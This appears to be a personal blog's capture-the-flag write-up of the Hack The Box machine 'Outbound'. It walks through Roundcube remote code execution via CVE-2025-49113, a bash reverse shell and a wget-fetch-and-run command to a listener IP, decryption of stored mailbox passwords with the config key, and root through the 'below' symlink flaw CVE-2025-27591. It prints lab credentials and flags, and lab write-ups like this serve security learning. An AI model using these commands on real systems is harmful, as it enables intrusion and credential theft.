---
title: 'The outbound machine writeup'
date: 2025-11-23
permalink: /outbound-htb/
tags:
  - writeups
  - htb
  - ctf
---

That was my first write up , Enjoy it


# Enumeration

## Nmap Scan
```bash
──(morpho㉿kali)-[~]
└─$ nmap -sCV -p22,80 10.10.11.77 -v -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 05:46 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 05:46
Completed NSE at 05:46, 0.00s elapsed
Initiating NSE at 05:46
Completed NSE at 05:46, 0.00s elapsed
Initiating NSE at 05:46
Completed NSE at 05:46, 0.00s elapsed
Initiating Ping Scan at 05:46
Scanning 10.10.11.77 [4 ports]
Completed Ping Scan at 05:46, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 05:46
Scanning mail.outbound.htb (10.10.11.77) [2 ports]
Discovered open port 80/tcp on 10.10.11.77
Discovered open port 22/tcp on 10.10.11.77
Completed SYN Stealth Scan at 05:46, 0.11s elapsed (2 total ports)
Initiating Service scan at 05:46
Scanning 2 services on mail.outbound.htb (10.10.11.77)
Completed Service scan at 05:46, 7.46s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.77.
Initiating NSE at 05:46
Completed NSE at 05:46, 4.86s elapsed
Initiating NSE at 05:46
Completed NSE at 05:46, 0.37s elapsed
Initiating NSE at 05:46
Completed NSE at 05:46, 0.00s elapsed
Nmap scan report for mail.outbound.htb (10.10.11.77)
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Roundcube Webmail :: Welcome to Roundcube Webmail
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### WhatWeb

```yaml
whatweb http://mail.outbound.htb
http://mail.outbound.htb [200 OK] Bootstrap, Content-Language[en], Cookies[roundcube_sessid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[roundcube_sessid], IP[10.10.11.77], JQuery, PasswordField[_pass], RoundCube, Script, Title[Roundcube Webmail :: Welcome to Roundcube Webmail], X-Frame-Options[sameorigin], nginx[1.24.0]
```

so when we try research about `Roundcube Webmail` exploit we got this 
[exploit](https://raw.githubusercontent.com/fearsoff-org/CVE-2025-49113/refs/heads/main/CVE-2025-49113.php) this script

so create a revshell and run a python server
```
echo 'sh -i >& /dev/tcp/10.10.14.60/1337 0>&1' > exploit.sh #Also use nc -lnvp 1337
python -m http.server
```

Exploit the code 
```
php CVE-2025-49113.php http://mail.outbound.htb tyler 'LhKL1o9Nm3X2' 'wget http://10.10.14.60:8000/exploit.sh -O /tmp/run.sh && chmod +x /tmp/run.sh && bash /tmp/run.sh'
```

Here is it we got shell

```
└─$ nc -lvnp 1337
listening on [any] 1337 ...

id
connect to [10.10.14.60] from (UNKNOWN) [10.10.11.77] 33888
sh: 0: can't access tty; job control turned off
$ $ uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

### Upgrade Shell via env
we dont have python so lets use this command for full ttys

```sh
SHELL=/bin/bash script -q /dev/null
```

---

# Lateral movement


**USERS**
```
$ ls -la /home
total 32
drwxr-xr-x 1 root  root  4096 Jun  8 12:05 .
drwxr-xr-x 1 root  root  4096 Jul  9 12:41 ..
drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 jacob
drwxr-x--- 1 mel   mel   4096 Jun  8 12:06 mel
drwxr-x--- 1 tyler tyler 4096 Jun  8 13:28 tyler
```

**CONFIG.php**

```
$ cat config/config.inc.php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```
**Database Credentials**:

- **DSN**: mysql://roundcube:RCDBPass2025@localhost/roundcube
    - **Username**: roundcube
    - **Password**: RCDBPass2025
    - **Host**: localhost
    - **Database**: 
so continue with connect the database

```bash
www-data@mail:/var/www/html/roundcube$ mysql -u roundcube -pRCDBPass2025 -h localhost roundcube
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 372
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [roundcube]> 

```

The `SHOW TABLES;` command show us databases's tables.


```bash
MariaDB [roundcube]> SHOW TABLES;
SHOW TABLES;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.001 sec)

****
```

Lets look up interesting Tables.

```
MariaDB [roundcube]> select * from users;
select * from users;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                               |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-06-11 07:51:32 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}         |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}         |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-10-10 12:03:31 | 2025-06-11 07:51:22 |                    1 | en_US    | a:2:{s:11:"client_hash";s:16:"bLA214masmoN9rNE";i:0;b:0;} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
3 rows in set (0.001 sec)

```


```json
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```
here is password it is from `SELECT sess_id, vars, changed FROM session;`  base64 encoded . 
- **Session 1**:
    - **sess_id**: `6a5ktqih5uca6lj8vrmgh9v0oh`
    - **changed**: 2025-06-08 15:46:40 (older session, likely stale).
    - **vars**: Long base64-encoded string containing serialized PHP data.

**Key Findings**:
- **Username**: `jacob` (user_id: 1, matching the users table).
- **Password**: `L7Rv00A8TuwJAr67kITxxcSgnIk25Am`/ (likely encrypted with `rcmail-!24ByteDESkey`*Str from config.inc.php).
- **IMAP Details**: `storage_host: localhost, storage_port: 143, storage_ssl: false (consistent with config.inc.php).`
- **Login Time**: `Unix timestamp 1749397119 (June 8, 2025, 15:38:39 UTC, close to changed timestamp).`
- **Auth Secret**: `DpYqv6maI9HxDL5GhcCd8JaQQW` (possibly a session token).
- **Request Token**: `TIsOaABA1zHSXZOChP6up5XFyayNRHaw` (used for CSRF protection).

**Crack The Password**

The password encoded with `key = b'rcmail-!24ByteDESkey*Str'` from `config/config.inc.php` 

write a little cracker script 

```python
import base64
from Crypto.Cipher import DES3

key = b'rcmail-!24ByteDESkey*Str'
cipher_b64 = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/'

def rcube_decrypt(cipher_b64, key):
    cipher_raw = base64.b64decode(cipher_b64)
    iv = cipher_raw[:8]
    ciphertext = cipher_raw[8:]
    cipher = DES3.new(key, DES3.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    pad_len = plaintext[-1]  # PKCS7 padding
    return plaintext[:-pad_len].decode(errors='ignore')

print(rcube_decrypt(cipher_b64, key))
```

the password of web database `595mO8DmwGeD`

this is not password of ssh 
```bash
www-data@mail:/var/www/html/roundcube$ su - jacob
su - jacob
Password: 595mO8DmwGeD

jacob@mail:~$ whoami
whoami
jacob
jacob@mail:~$ 
```

but thats web shell currently mail .

```shell
jacob@mail:~$ ls -la
ls -la
total 36
drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 .
drwxr-xr-x 1 root  root  4096 Jun  8 12:05 ..
lrwxrwxrwx 1 root  root     9 Jun  6 19:03 .bash_history -> /dev/null
-rw-r--r-- 1 jacob jacob  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 jacob jacob 3771 Mar 31  2024 .bashrc
-rw-r--r-- 1 jacob jacob  807 Mar 31  2024 .profile
drwx------ 1 jacob jacob 4096 Jul  9 12:41 mail
```



```bash
jacob@mail:~$ cd mail
cd mail
jacob@mail:~/mail$ ls -la
ls -la
total 36
drwx------ 1 jacob jacob 4096 Jul  9 12:41 .
drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 ..
drwx------ 1 jacob jacob 4096 Jul  9 12:41 .imap
-rw------- 1 jacob jacob   11 Jun  7 13:59 .subscriptions
drwxrwx--- 3 jacob jacob 4096 Jul  9 12:41 INBOX
-rw------- 1 jacob jacob  528 Jun  7 13:59 Trash
jacob@mail:~/mail$ cd INBOX
cd INBOX
jacob@mail:~/mail/INBOX$ ls
ls
jacob
jacob@mail:~/mail/INBOX$ cat jacob
cat jacob
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
	id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel

```

so we got jacob's ssh password

`gY4Wr3a1evp4`

```bash
jacob@outbound:~$ id
uid=1002(jacob) gid=1002(jacob) groups=1002(jacob),100(users)
jacob@outbound:~$ ls -la
total 28
drwxr-x--- 3 jacob jacob 4096 Jul  8 20:14 .
drwxr-xr-x 5 root  root  4096 Jul  8 20:14 ..
lrwxrwxrwx 1 root  root     9 Jul  8 11:12 .bash_history -> /dev/null
-rw-r--r-- 1 jacob jacob  220 Jun  8 12:14 .bash_logout
-rw-r--r-- 1 jacob jacob 3771 Jun  8 12:14 .bashrc
drwx------ 2 jacob jacob 4096 Jun 11 11:32 .cache
-rw-r--r-- 1 jacob jacob  807 Jun  8 12:14 .profile
-rw-r----- 1 root  jacob   33 Oct 10 10:17 user.txt
jacob@outbound:~$ cat user.txt 
55fc2aa5f3ef196d41e58b543c66d5ba
```

`user.txt` --> 55fc2aa5f3ef196d41e58b543c66d5ba

---

# Privilege Escalation

```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```


When we check [https://github.com/facebookincubator/below](https://github.com/facebookincubator/below) This address . We see it have important Security Notification [https://github.com/facebookincubator/below/security/advisories/GHSA-9mc5-7qhg-fp3w](https://github.com/facebookincubator/below/security/advisories/GHSA-9mc5-7qhg-fp3w)


[CVE-2025-27591](https://www.cve.org/CVERecord?id=CVE-2025-27591)

 [EXPLOIT](https://github.com/00xCanelo/CVE-2025-27591)


```
jacob@outbound:/tmp$ ./exploit.sh 
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/fakeadmin
[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
[*] Executing 'below record' as root to trigger logging...
Oct 10 19:36:23.188 DEBG Starting up!
Oct 10 19:36:23.188 ERRO 
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01760054400: EAGAIN: Try again
-------------------------------------------------------------
[+] 'below record' executed.
[*] Appending payload into /etc/passwd via symlink...
[+] Payload appended successfully.
[*] Attempting to switch to root shell via 'su fakeadmin'...
root@outbound:/tmp# whoami
root
root@outbound:/tmp# cd /root
root@outbound:~# ls
root.txt
root@outbound:~# cat root.txt 
2c8b4d9d2e681563806985c69b736899
```

